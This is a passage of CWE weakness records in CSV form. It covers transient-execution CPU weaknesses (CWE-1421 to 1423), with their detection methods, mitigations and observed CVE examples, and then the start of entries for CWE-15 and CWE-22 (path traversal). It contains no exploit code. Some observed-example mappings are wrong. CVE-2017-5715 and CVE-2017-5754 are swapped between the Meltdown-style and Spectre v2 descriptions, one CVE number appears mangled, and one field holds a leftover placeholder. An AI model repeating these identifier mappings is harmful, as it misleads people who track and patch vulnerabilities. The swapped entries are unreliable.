data.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:LIKELIHOOD:Medium::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected in hardware by manually inspecting processor specifications. Features that exhibit this weakness may include microarchitectural predictors, access control checks that occur out-of-order, or any other features that can allow operations to execute without committing to architectural state. Academic researchers have demonstrated that new hardware weaknesses can be discovered by exhaustively analyzing a processor's machine clear (or nuke) conditions ([REF-1427]).:EFFECTIVENESS:Moderate::METHOD:Fuzzing:DESCRIPTION:Academic researchers have demonstrated that this weakness can be detected in hardware using software fuzzing tools that treat the underlying hardware as a black box ([REF-1428]).:EFFECTIVENESS:Opportunistic::METHOD:Fuzzing:DESCRIPTION:Academic researchers have demonstrated that this weakness can be detected in software using software fuzzing tools ([REF-1429]).:EFFECTIVENESS:Opportunistic::METHOD:Automated Static Analysis:DESCRIPTION:A variety of automated static analysis tools can identify potentially exploitable code sequences in software. These tools may perform the analysis on source code, on binary code, or on an intermediate code representation (for example, during compilation).:EFFECTIVENESS:Limited::METHOD:Automated Analysis:DESCRIPTION:Software vendors can release tools that detect presence of known weaknesses on a processor. For example, some of these tools can attempt to transiently execute a vulnerable code sequence and detect whether code successfully leaks data in a manner consistent with the weakness under test. Alternatively, some hardware vendors provide enumeration for the presence of a weakness (or lack of a weakness). These enumeration bits can be checked and reported by system software. For example, Linux supports these checks for many commodity processors: $ cat /proc/cpuinfo | grep bugs | head -n 1 bugs : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa itlb_multihit srbds mmio_stale_data retbleed:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:The hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.:EFFECTIVENESS:Limited::PHASE:Requirements:DESCRIPTION:Processor designers may expose instructions or other architectural features that allow software to mitigate the effects of transient execution, but without disabling predictors. These features may also help to limit opportunities for data exposure.:EFFECTIVENESS:Moderate::PHASE:Requirements:DESCRIPTION:Processor designers may expose registers (for example, control registers or model-specific registers) that allow privileged and/or user software to disable specific predictors or other hardware features that can cause confidential data to be exposed during transient execution.:EFFECTIVENESS:Limited::PHASE:Requirements:DESCRIPTION:Processor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels.:EFFECTIVENESS:Defense in Depth::PHASE:Build and Compilation:DESCRIPTION:Isolate sandboxes or managed runtimes in separate address spaces (separate processes). For examples, see [REF-1421].:EFFECTIVENESS:High::PHASE:Build and Compilation:DESCRIPTION:Include serialization instructions (for example, LFENCE) that prevent processor events or mis-predictions prior to the serialization instruction from causing transient execution after the serialization instruction. For some weaknesses, a serialization instruction can also prevent a processor event or a mis-prediction from occurring after the serialization instruction (for example, CVE-2018-3639 can allow a processor to predict that a load will not depend on an older store; a serialization instruction between the store and the load may allow the store to update memory and prevent the prediction from happening at all).:EFFECTIVENESS:Moderate::PHASE:Build and Compilation:DESCRIPTION:Use control-flow integrity (CFI) techniques to constrain the behavior of instructions that redirect the instruction pointer, such as indirect branch instructions.:EFFECTIVENESS:Moderate::PHASE:Build and Compilation:DESCRIPTION:If the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated, and instead generate an alternate sequence of instructions that is not affected by the weakness. One prominent example of this mitigation is retpoline ([REF-1414]).:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:Use software techniques that can mitigate the consequences of transient execution. For example, address masking can be used in some circumstances to prevent out-of-bounds transient reads.:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:Use software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.:EFFECTIVENESS:Incidental::PHASE:Documentation:DESCRIPTION:If a hardware feature can allow incorrect operations (or correct operations with incorrect data) to execute transiently, the hardware designer may opt to disclose this behavior in architecture documentation. This documentation can inform users about potential consequences and effective mitigations.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2017-5753:DESCRIPTION:Microarchitectural conditional branch predictors may allow operations to execute transiently after a misprediction, potentially exposing data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5753::REFERENCE:CVE-2021-0089:DESCRIPTION:A machine clear triggered by self-modifying code may allow incorrect operations to execute transiently, potentially exposing data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-0089::REFERENCE:CVE-2022-0002:DESCRIPTION:Microarchitectural indirect branch predictors may allow incorrect operations to execute transiently after a misprediction, potentially exposing data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-0002::\",,,\"\",,\"\",\n1421,\"Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\",Base,Incomplete,\"A processor event may allow transient operations to access architecturally restricted data (for example, in another address space) in a shared microarchitectural structure (for example, a CPU cache), potentially exposing the data over a covert channel.\",\"Many commodity processors have Instruction Set Architecture (ISA) features that protect software components from one another. These features can include memory segmentation, virtual memory, privilege rings, trusted execution environments, and virtual machines, among others. For example, virtual memory provides each process with its own address space, which prevents processes from accessing each other's private data. Many of these features can be used to form hardware-enforced security boundaries between software components. Many commodity processors also share microarchitectural resources that cache (temporarily store) data, which may be confidential. These resources may be shared across processor contexts, including across SMT threads, privilege rings, or others. When transient operations allow access to ISA-protected data in a shared microarchitectural resource, this might violate users' expectations of the ISA feature that is bypassed. For example, if transient operations can access a victim's private data in a shared microarchitectural resource, then the operations' microarchitectural side effects may correspond to the accessed data. If an attacker can trigger these transient operations and observe their side effects through a covert channel [REF-1400], then the attacker may be able to infer the victim's private data. Private data could include sensitive program data, OS/VMM data, page table data (such as memory addresses), system configuration data (see Demonstrative Example 3), or any other data that the attacker does not have the required privileges to access.\",::NATURE:ChildOf:CWE ID:1420:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1420:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can be introduced during hardware architecture and design if a data path allows architecturally restricted data to propagate to operations that execute before an older mis-prediction or processor event (such as an exception) is caught.::PHASE:Implementation:NOTE:This weakness can be introduced during system software implementation if state-sanitizing operations are not invoked when switching from one context to another, according to the hardware vendor's recommendations for mitigating the weakness.::PHASE:System Configuration:NOTE:This weakness can be introduced if the system has not been configured according to the hardware vendor's recommendations for mitigating the weakness.::PHASE:Architecture and Design:NOTE:This weakness can be introduced when an access control check (for example, checking page permissions) can proceed in parallel with the access operation (for example, a load) that is being checked. If the processor can allow the access operation to execute before the check completes, this race condition may allow subsequent transient operations to expose sensitive information.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:LIKELIHOOD:Medium:NOTE:<<put the information here>>::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected in hardware by manually inspecting processor specifications. Features that exhibit this weakness may include microarchitectural predictors, access control checks that occur out-of-order, or any other features that can allow operations to execute without committing to architectural state. Academic researchers have demonstrated that new hardware weaknesses can be discovered by examining publicly available patent filings, for example [REF-1405] and [REF-1406]. Hardware designers can also scrutinize aspects of the instruction set architecture that have undefined behavior; these can become a focal point when applying other detection methods.:EFFECTIVENESS:Moderate::METHOD:Automated Analysis:DESCRIPTION:This weakness can be detected (pre-discovery) in hardware by employing static or dynamic taint analysis methods [REF-1401]. These methods can label data in one context (for example, kernel data) and perform information flow analysis (or a simulation, etc.) to determine whether tainted data can appear in another context (for example, user mode). Alternatively, stale or invalid data in shared microarchitectural resources can be marked as tainted, and the taint analysis framework can identify when transient operations encounter tainted data.:EFFECTIVENESS:Moderate::METHOD:Automated Analysis:DESCRIPTION:Software vendors can release tools that detect presence of known weaknesses (post-discovery) on a processor. For example, some of these tools can attempt to transiently execute a vulnerable code sequence and detect whether code successfully leaks data in a manner consistent with the weakness under test. Alternatively, some hardware vendors provide enumeration for the presence of a weakness (or lack of a weakness). These enumeration bits can be checked and reported by system software. For example, Linux supports these checks for many commodity processors: $ cat /proc/cpuinfo | grep bugs | head -n 1 bugs : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa itlb_multihit srbds mmio_stale_data retbleed:EFFECTIVENESS:High::METHOD:Fuzzing:DESCRIPTION:Academic researchers have demonstrated that this weakness can be detected in hardware using software fuzzing tools that treat the underlying hardware as a black box ([REF-1406], [REF-1430]):EFFECTIVENESS:Opportunistic::\",\"::PHASE:Architecture and Design:DESCRIPTION:Hardware designers may choose to engineer the processor's pipeline to prevent architecturally restricted data from being used by operations that can execute transiently.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Hardware designers may choose not to share microarchitectural resources that can contain sensitive data, such as fill buffers and store buffers.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:Hardware designers may choose to sanitize specific microarchitectural state (for example, store buffers) when the processor transitions to a different context, such as whenever a system call is invoked. Alternatively, the hardware may expose instruction(s) that allow software to sanitize microarchitectural state according to the user or system administrator's threat model. These mitigation approaches are similar to those that address CWE-226; however, sanitizing microarchitectural state may not be the optimal or best way to mitigate this weakness on every processor design.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:The hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:DESCRIPTION:Software architects may design software to enforce strong isolation between different contexts. For example, kernel page table isolation (KPTI) mitigates the Meltdown vulnerability [REF-1401] by separating user-mode page tables from kernel-mode page tables, which prevents user-mode processes from using Meltdown to transiently access kernel memory [REF-1404].:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:If the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated, and instead generate an alternate sequence of instructions that is not affected by the weakness.:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:Use software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.:EFFECTIVENESS:Incidental::PHASE:Implementation:DESCRIPTION:System software can mitigate this weakness by invoking state-sanitizing operations when switching from one context to another, according to the hardware vendor's recommendations.:EFFECTIVENESS:Limited::PHASE:System Configuration:DESCRIPTION:Some systems may allow the user to disable (for example, in the BIOS) sharing of the affected resource.:EFFECTIVENESS:Limited::PHASE:System Configuration:DESCRIPTION:Some systems may allow the user to disable (for example, in the BIOS) microarchitectural features that allow transient access to architecturally restricted data.:EFFECTIVENESS:Limited::PHASE:Patching and Maintenance:DESCRIPTION:The hardware vendor may provide a patch to sanitize the affected shared microarchitectural state when the processor transitions to a different context.:EFFECTIVENESS:Moderate::PHASE:Patching and Maintenance:DESCRIPTION:This kind of patch may not be feasible or implementable for all processors or all weaknesses.:EFFECTIVENESS:Limited::PHASE:Requirements:DESCRIPTION:Processor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2017-5715:DESCRIPTION:A fault may allow transient user-mode operations to access kernel data cached in the L1D, potentially exposing the data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5715::REFERENCE:CVE-2018-3615:DESCRIPTION:A fault may allow transient non-enclave operations to access SGX enclave data cached in the L1D, potentially exposing the data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2018-3615::REFERENCE:CVE-2019-1135:DESCRIPTION:A TSX Asynchronous Abort may allow transient operations to access architecturally restricted data, potentially exposing the data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1135::\",,,\"\",,\"\",\n1422,\"Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\",Base,Incomplete,\"A processor event or prediction may allow incorrect or stale data to be forwarded to transient operations, potentially exposing data over a covert channel.\",\"Software may use a variety of techniques to preserve the confidentiality of private data that is accessible within the current processor context. For example, the memory safety and type safety properties of some high-level programming languages help to prevent software written in those languages from exposing private data. As a second example, software sandboxes may co-locate multiple users' software within a single process. The processor's Instruction Set Architecture (ISA) may permit one user's software to access another user's data (because the software shares the same address space), but the sandbox prevents these accesses by using software techniques such as bounds checking. If incorrect or stale data can be forwarded (for example, from a cache) to transient operations, then the operations' microarchitectural side effects may correspond to the data. If an attacker can trigger these transient operations and observe their side effects through a covert channel, then the attacker may be able to infer the data. For example, an attacker process may induce transient execution in a victim process that causes the victim to inadvertently access and then expose its private data via a covert channel. In the software sandbox example, an attacker sandbox may induce transient execution in its own code, allowing it to transiently access and expose data in a victim sandbox that shares the same address space. Consequently, weaknesses that arise from incorrect/stale data forwarding might violate users' expectations of software-based memory safety and isolation techniques. If the data forwarding behavior is not properly documented by the hardware vendor, this might violate the software vendor's expectation of how the hardware should behave.\",::NATURE:ChildOf:CWE ID:1420:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1420:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can be introduced by data speculation techniques, or when the processor pipeline is designed to check exception conditions concurrently with other operations. This weakness can also persist after a CWE-1421 weakness has been mitigated. For example, suppose that a processor can forward stale data from a shared microarchitectural buffer to dependent transient operations, and furthermore suppose that the processor has been patched to flush the buffer on context switches. This mitigates the CWE-1421 weakness, but the stale-data forwarding behavior may persist as a CWE-1422 weakness unless this behavior is also patched.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:LIKELIHOOD:Medium::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:A variety of automated static analysis tools can identify potentially exploitable code sequences in software. These tools may perform the analysis on source code, on binary code, or on an intermediate code representation (for example, during compilation).:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected in hardware by manually inspecting processor specifications. Features that exhibit this weakness may include microarchitectural predictors, access control checks that occur out-of-order, or any other features that can allow operations to execute without committing to architectural state.Hardware designers can also scrutinize aspects of the instruction set architecture that have undefined behavior; these can become a focal point when applying other detection methods.:EFFECTIVENESS:Moderate::METHOD:Automated Analysis:DESCRIPTION:Software vendors can release tools that detect presence of known weaknesses on a processor. For example, some of these tools can attempt to transiently execute a vulnerable code sequence and detect whether code successfully leaks data in a manner consistent with the weakness under test. Alternatively, some hardware vendors provide enumeration for the presence of a weakness (or lack of a weakness). These enumeration bits can be checked and reported by system software. For example, Linux supports these checks for many commodity processors: $ cat /proc/cpuinfo | grep bugs | head -n 1 bugs : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa itlb_multihit srbds mmio_stale_data retbleed:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:The hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.:EFFECTIVENESS:Limited::PHASE:Requirements:DESCRIPTION:Processor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels.:EFFECTIVENESS:Defense in Depth::PHASE:Requirements:DESCRIPTION:Processor designers may expose instructions or other architectural features that allow software to mitigate the effects of transient execution, but without disabling predictors. These features may also help to limit opportunities for data exposure.:EFFECTIVENESS:Moderate::PHASE:Requirements:DESCRIPTION:Processor designers may expose registers (for example, control registers or model-specific registers) that allow privileged and/or user software to disable specific predictors or other hardware features that can cause confidential data to be exposed during transient execution.:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:Use software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.:EFFECTIVENESS:Incidental::PHASE:Build and Compilation:DESCRIPTION:Isolate sandboxes or managed runtimes in separate address spaces (separate processes).:EFFECTIVENESS:High::PHASE:Build and Compilation:DESCRIPTION:Include serialization instructions (for example, LFENCE) that prevent processor events or mis-predictions prior to the serialization instruction from causing transient execution after the serialization instruction. For some weaknesses, a serialization instruction can also prevent a processor event or a mis-prediction from occurring after the serialization instruction (for example, CVE-2018-3639 can allow a processor to predict that a load will not depend on an older store; a serialization instruction between the store and the load may allow the store to update memory and prevent the mis-prediction from happening at all).:EFFECTIVENESS:Moderate::PHASE:Build and Compilation:DESCRIPTION:Use software techniques that can mitigate the consequences of transient execution. For example, address masking can be used in some circumstances to prevent out-of-bounds transient reads.:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:If the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated, and instead generate an alternate sequence of instructions that is not affected by the weakness.:EFFECTIVENESS:Limited::PHASE:Documentation:DESCRIPTION:If a hardware feature can allow incorrect or stale data to be forwarded to transient operations, the hardware designer may opt to disclose this behavior in architecture documentation. This documentation can inform users about potential consequences and effective mitigations.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2020-0551:DESCRIPTION:A fault, microcode assist, or abort may allow transient load operations to forward malicious stale data to dependent operations executed by a victim, causing the victim to unintentionally access and potentially expose its own data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-0551::REFERENCE:CVE-2020-8698:DESCRIPTION:A fast store forwarding predictor may allow store operations to forward incorrect data to transient load operations, potentially exposing data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8698::\",,,\"\",,\"\",\n1423,\"Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\",Base,Incomplete,\"Shared microarchitectural predictor state may allow code to influence transient execution across a hardware boundary, potentially exposing data that is accessible beyond the boundary over a covert channel.\",\"Many commodity processors have Instruction Set Architecture (ISA) features that protect software components from one another. These features can include memory segmentation, virtual memory, privilege rings, trusted execution environments, and virtual machines, among others. For example, virtual memory provides each process with its own address space, which prevents processes from accessing each other's private data. Many of these features can be used to form hardware-enforced security boundaries between software components. When separate software components (for example, two processes) share microarchitectural predictor state across a hardware boundary, code in one component may be able to influence microarchitectural predictor behavior in another component. If the predictor can cause transient execution, the shared predictor state may allow an attacker to influence transient execution in a victim, and in a manner that could allow the attacker to infer private data from the victim by monitoring observable discrepancies (CWE-203) in a covert channel [REF-1400]. Predictor state may be shared when the processor transitions from one component to another (for example, when a process makes a system call to enter the kernel). Many commodity processors have features which prevent microarchitectural predictions that occur before a boundary from influencing predictions that occur after the boundary. Predictor state may also be shared between hardware threads, for example, sibling hardware threads on a processor that supports simultaneous multithreading (SMT). This sharing may be benign if the hardware threads are simultaneously executing in the same software component, or it could expose a weakness if one sibling is a malicious software component, and the other sibling is a victim software component. Processors that share microarchitectural predictors between hardware threads may have features which prevent microarchitectural predictions that occur on one hardware thread from influencing predictions that occur on another hardware thread. Features that restrict predictor state sharing across transitions or between hardware threads may be always-on, on by default, or may require opt-in from software.\",::NATURE:ChildOf:CWE ID:1420:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1420:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Microcontroller Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can be introduced during hardware architecture and design if predictor state is not properly isolated between modes (for example, user mode and kernel mode), if predictor state is not isolated between hardware threads, or if it is not isolated between other kinds of execution contexts supported by the processor.::PHASE:Implementation:NOTE:This weakness can be introduced during system software implementation if predictor-state-sanitizing operations (for example, the indirect branch prediction barrier on Intel x86) are not invoked when switching from one context to another.::PHASE:System Configuration:NOTE:This weakness can be introduced if the system has not been configured according to the hardware vendor's recommendations for mitigating the weakness.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:LIKELIHOOD:Medium::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected in hardware by manually inspecting processor specifications. Features that exhibit this weakness may have microarchitectural predictor state that is shared between hardware threads, execution contexts (for example, user and kernel), or other components that may host mutually distrusting software (or firmware, etc.).:EFFECTIVENESS:Moderate::METHOD:Automated Analysis:DESCRIPTION:Software vendors can release tools that detect presence of known weaknesses on a processor. For example, some of these tools can attempt to transiently execute a vulnerable code sequence and detect whether code successfully leaks data in a manner consistent with the weakness under test. Alternatively, some hardware vendors provide enumeration for the presence of a weakness (or lack of a weakness). These enumeration bits can be checked and reported by system software. For example, Linux supports these checks for many commodity processors: $ cat /proc/cpuinfo | grep bugs | head -n 1 bugs : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa itlb_multihit srbds mmio_stale_data retbleed:EFFECTIVENESS:High::METHOD:Automated Analysis:DESCRIPTION:This weakness can be detected in hardware by employing static or dynamic taint analysis methods [REF-1401]. These methods can label each predictor entry (or prediction history, etc.) according to the processor context that created it. Taint analysis or information flow analysis can then be applied to detect when predictor state created in one context can influence predictions made in another context.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:DESCRIPTION:The hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.::PHASE:Architecture and Design:DESCRIPTION:Hardware designers may choose to use microarchitectural bits to tag predictor entries. For example, each predictor entry may be tagged with a kernel-mode bit which, when set, indicates that the predictor entry was created in kernel mode. The processor can use this bit to enforce that predictions in the current mode must have been trained in the current mode. This can prevent malicious cross-mode training, such as when user-mode software attempts to create predictor entries that influence transient execution in the kernel. Predictor entry tags can also be used to associate each predictor entry with the SMT thread that created it, and thus the processor can enforce that each predictor entry can only be used by the SMT thread that created it. This can prevent an SMT thread from using predictor entries crafted by a malicious sibling SMT thread.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:Hardware designers may choose to sanitize microarchitectural predictor state (for example, branch prediction history) when the processor transitions to a different context, for example, whenever a system call is invoked. Alternatively, the hardware may expose instruction(s) that allow software to sanitize predictor state according to the user's threat model. For example, this can allow operating system software to sanitize predictor state when performing a context switch from one process to another.:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:System software can mitigate this weakness by invoking predictor-state-sanitizing operations (for example, the indirect branch prediction barrier on Intel x86) when switching from one context to another, according to the hardware vendor's recommendations.:EFFECTIVENESS:Moderate::PHASE:Build and Compilation:DESCRIPTION:If the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated. One prominent example of this mitigation is retpoline ([REF-1414]).:EFFECTIVENESS:Limited::PHASE:Build and Compilation:DESCRIPTION:Use control-flow integrity (CFI) techniques to constrain the behavior of instructions that redirect the instruction pointer, such as indirect branch instructions.:EFFECTIVENESS:Moderate::PHASE:Build and Compilation:DESCRIPTION:Use software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.:EFFECTIVENESS:Incidental::PHASE:System Configuration:DESCRIPTION:Some systems may allow the user to disable predictor sharing. For example, this could be a BIOS configuration, or a model-specific register (MSR) that can be configured by the operating system or virtual machine monitor.:EFFECTIVENESS:Moderate::PHASE:Patching and Maintenance:DESCRIPTION:The hardware vendor may provide a patch to, for example, sanitize predictor state when the processor transitions to a different context, or to prevent predictor entries from being shared across SMT threads. A patch may also introduce new ISA that allows software to toggle a mitigation.:EFFECTIVENESS:Moderate::PHASE:Documentation:DESCRIPTION:If a hardware feature can allow microarchitectural predictor state to be shared between contexts, SMT threads, or other architecturally defined boundaries, the hardware designer may opt to disclose this behavior in architecture documentation. This documentation can inform users about potential consequences and effective mitigations.:EFFECTIVENESS:High::PHASE:Requirements:DESCRIPTION:Processor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels.::\",\"::REFERENCE:CVE-2017-5754:DESCRIPTION:(Branch Target Injection, BTI, Spectre v2). Shared microarchitectural indirect branch predictor state may allow code to influence transient execution across a process, VM, or privilege boundary, potentially exposing data that is accessible beyond the boundary.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-5754::REFERENCE:CVE-2022-0001:DESCRIPTION:(Branch History Injection, BHI, Spectre-BHB). Shared branch history state may allow user-mode code to influence transient execution in the kernel, potentially exposing kernel data over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-0001::REFERENCE:CVE-2021-33149:DESCRIPTION:(RSB underflow, Retbleed). Shared return stack buffer state may allow code that executes before a prediction barrier to influence transient execution after the prediction barrier, potentially exposing data that is accessible beyond the barrier over a covert channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33149::\",,,\"\",,\"\","
  },
  "doc-05346b114fdb73b6688094b54c61ab09": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n15,\"External Control of System or Configuration Setting\",Base,Incomplete,\"One or more system settings or configuration elements can be externally controlled by a user.\",\"Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:610:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation Architecture and Design:DESCRIPTION:Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.::PHASE:Implementation Architecture and Design:DESCRIPTION:In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Setting Manipulation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP25:ENTRY NAME:Tainted input to variable::\",::13::146::176::203::270::271::579::69::76::77::,\"\",\n22,\"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\",Base,Stable,\"The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.\",\"Many file operations are intended to take place within a restricted directory. By using special elements such as .. and / separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the ../ sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as /usr/local/bin to access unexpected files. This is referred to as absolute path traversal.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:706:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Directory traversal::TERM:Path traversal:DESCRIPTION:Path traversal is preferred over directory traversal, but both terms are attack-focused.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:The attacker may be able to create 